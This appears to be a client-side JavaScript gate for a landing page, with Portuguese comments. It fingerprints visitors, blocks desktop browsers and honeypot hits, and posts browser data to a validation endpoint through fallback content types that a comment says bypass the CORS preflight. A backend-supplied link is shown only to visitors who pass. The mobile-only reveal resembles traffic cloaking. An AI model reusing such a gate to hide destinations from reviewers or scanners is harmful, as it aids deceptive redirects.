(() => {
    'use strict';

    const DEBUG_MODE = true; 

    const CONFIG = Object.freeze({
        DURATION_SECONDS: 3,
        VALIDATE_ENDPOINT: '/api/validate',
    });

    const STATUS = Object.freeze({ PASS: 'PASS', WARNING: 'WARNING', BLOCK: 'BLOCK' });
    const byId = (id) => document.getElementById(id);
    
    const dom = {
        loadingArea: byId('loading-area'),
        accessibleContent: byId('accessible-content'),
        countdownDisplay: byId('countdown-display'),
        loadingText: byId('loading-text'),
        accessButton: byId('access-button'),
        honeypot: byId('honeypot'),
    };

    let timeLeft = CONFIG.DURATION_SECONDS;
    let countdownInterval = null;
    let isValidationComplete = false;
    const startTime = Date.now(); 

    function log(msg, data = null) {
        if (DEBUG_MODE) console.log(`[DIG-DEBUG] ${msg}`, data ? data : '');
    }

    async function validateUser() {
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) || ('ontouchstart' in window);
        const browserData = {
            userAgent: navigator.userAgent,
            screenResolution: `${screen.width}x${screen.height}`,
            platform: navigator.platform,
            language: navigator.language,
            isMobile: isMobile,
            honeypotValue: dom.honeypot ? dom.honeypot.value : '',
            elapsedTime: Date.now() - startTime
        };

        log("Métricas:", browserData);

        if (!browserData.isMobile || browserData.honeypotValue !== '' || browserData.elapsedTime < 10) {
            log("BLOQUEIO FRONT (Regra local de segurança).");
            isValidationComplete = true;
            checkAndProceed('BLOCK');
            return;
        }

        let responseData = null;

        // ==================================================
        // CAMADA 1: JSON Padrão (Tenta a rota do _worker.js)
        // ==================================================
        try {
            log("CAMADA 1: Tentando POST com application/json...");
            const res = await fetch(CONFIG.VALIDATE_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(browserData),
            });
            log(`CAMADA 1 Status HTTP: ${res.status}`);
            if (res.ok) {
                responseData = await res.json();
            }
        } catch (err) {
            log("CAMADA 1 Falhou (Erro de rede/CORS).", err.message);
        }

        // ==================================================
        // CAMADA 2: text/plain (Contorna erro 405 e CORS Preflight)
        // ==================================================
        if (!responseData) {
            try {
                log("CAMADA 2: Tentando POST com text/plain...");
                const res = await fetch(CONFIG.VALIDATE_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'text/plain' }, // Ignora OPTIONS!
                    body: JSON.stringify(browserData),
                });
                log(`CAMADA 2 Status HTTP: ${res.status}`);
                if (res.ok) {
                    responseData = await res.json();
                }
            } catch (err) {
                log("CAMADA 2 Falhou.", err.message);
            }
        }

        // ==================================================
        // CAMADA 3: form-urlencoded (Ultra compatibilidade)
        // ==================================================
        if (!responseData) {
            try {
                log("CAMADA 3: Tentando POST com x-www-form-urlencoded...");
                const res = await fetch(CONFIG.VALIDATE_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: JSON.stringify(browserData), // Envia como string, o backend lê como texto
                });
                log(`CAMADA 3 Status HTTP: ${res.status}`);
                if (res.ok) {
                    responseData = await res.json();
                }
            } catch (err) {
                log("CAMADA 3 Falhou.", err.message);
            }
        }

        // ==================================================
        // RESULTADO FINAL
        // ==================================================
        isValidationComplete = true;
        
        if (responseData) {
            log("JSON recebido com sucesso:", responseData);
            if (responseData.status === STATUS.PASS || responseData.status === STATUS.WARNING) {
                checkAndProceed(responseData.status, responseData.link); 
            } else {
                log(`Backend retornou BLOCK. Motivo: ${responseData.reason}`);
                checkAndProceed('BLOCK');
            }
        } else {
            log("TODAS AS CAMADAS FALHARAM. (Verifique os logs do Worker).");
            checkAndProceed('BLOCK');
        }
    }

    // --- Controle de UI (Timer) ---
    function updateCountdown() {
        timeLeft -= 1;
        if (dom.countdownDisplay) dom.countdownDisplay.textContent = Math.max(timeLeft, 0);
        if (timeLeft <= 0) {
            stopCountdown();
            if (isValidationComplete) executeAction(window.pendingAction, window.pendingLink);
        }
    }

    function stopCountdown() {
        if (countdownInterval !== null) { clearInterval(countdownInterval); countdownInterval = null; }
    }

    function checkAndProceed(action, link = null) {
        window.pendingAction = action;
        window.pendingLink = link;
        if (timeLeft <= 0) executeAction(action, link);
    }

    function executeAction(action, link) {
        log(`Ação Final: ${action}`);
        if (action === 'PASS' || action === 'WARNING') {
            stopCountdown();
            if (dom.loadingText) dom.loadingText.textContent = 'Concluído';
            dom.loadingArea?.classList.add('hidden');
            dom.accessibleContent?.classList.remove('hidden');
            if (dom.accessButton && link) dom.accessButton.href = link;
        } else {
            stopCountdown();
            if (dom.countdownDisplay) dom.countdownDisplay.textContent = 'X';
            if (dom.loadingText) dom.loadingText.textContent = 'Acesso Negado.';
            document.querySelector('.loading-container')?.style.setProperty('border-color', 'rgba(255, 50, 50, 0.4)');
        }
    }

    if (dom.countdownDisplay) dom.countdownDisplay.textContent = CONFIG.DURATION_SECONDS;
    countdownInterval = setInterval(updateCountdown, 1000);
    setTimeout(validateUser, 100); 
})();
